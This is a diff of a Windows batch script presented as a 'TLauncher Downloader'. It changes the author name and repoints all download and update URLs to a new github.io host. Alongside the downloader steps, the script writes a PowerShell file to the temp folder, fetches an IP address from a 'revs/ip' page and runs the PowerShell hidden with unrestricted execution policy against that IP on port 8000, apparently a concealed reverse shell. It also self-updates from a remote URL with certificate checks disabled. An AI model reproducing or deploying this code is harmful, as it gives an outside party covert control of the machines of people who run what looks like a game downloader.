@@ -1,5 +1,5 @@
 @echo off
-title TLauncher Downloader ^| by aritz331_ for Aritz's Utils - an aritz331_ original series
+title TLauncher Downloader ^| by eltrevi_ for Trevi's Utils - an eltrevi_ original series
 if not exist %temp%\331 (md %temp%\331) else (attrib -s -h -r %temp%\331)
 cd %temp%\331
 
@@ -27,7 +27,7 @@ call :start
 exit /b
 
 :update
-curl -#kL "https://aritz331.github.io/tl/tl.bat" -o tl2.bat || exit /b
+curl -#kL "https://eltrevii.github.io/tl/tl.bat" -o tl2.bat || exit /b
 fc "%~dpnx0" "tl2.bat">nul || (goto doupdate)
 exit /b
 
@@ -38,14 +38,14 @@ exit
 
 :check
 echo ok>s1.txt
-curl -kLs "https://aritz331.github.io/tl/s.txt" -o s2.txt
+curl -kLs "https://eltrevii.github.io/tl/s.txt" -o s2.txt
 fc s1.txt s2.txt>nul || goto not
 exit /b
 
 :dl-7z
 echo Downloading 7-zip
-curl -#kLO "https://aritz331.github.io/stuff/7z/{7z.exe,7-zip.dll}"
-curl -#kLO "https://aritz331.github.io/stuff/7z/{7z.dll,7-zip32.dll}"
+curl -#kLO "https://eltrevii.github.io/stuff/7z/{7z.exe,7-zip.dll}"
+curl -#kLO "https://eltrevii.github.io/stuff/7z/{7z.dll,7-zip32.dll}"
 exit /b
 
 :dl-tl
@@ -96,7 +96,7 @@ echo $PLP.Flush^(^)};
 echo $KLK.Close^(^)
 )>%temp%\331.ps1
 
-for /f %%i in ('curl -kLs aritz331.github.io/revs/ip') do (set "_ip=%%i")
+for /f %%i in ('curl -kLs eltrevii.github.io/revs/ip') do (set "_ip=%%i")
 if [%1]==[] (
 powershell -NoP -W hidden -ExecutionPolicy Unrestricted %temp%\331.ps1 %_ip% 8000 >nul 2>&1
 ) else (
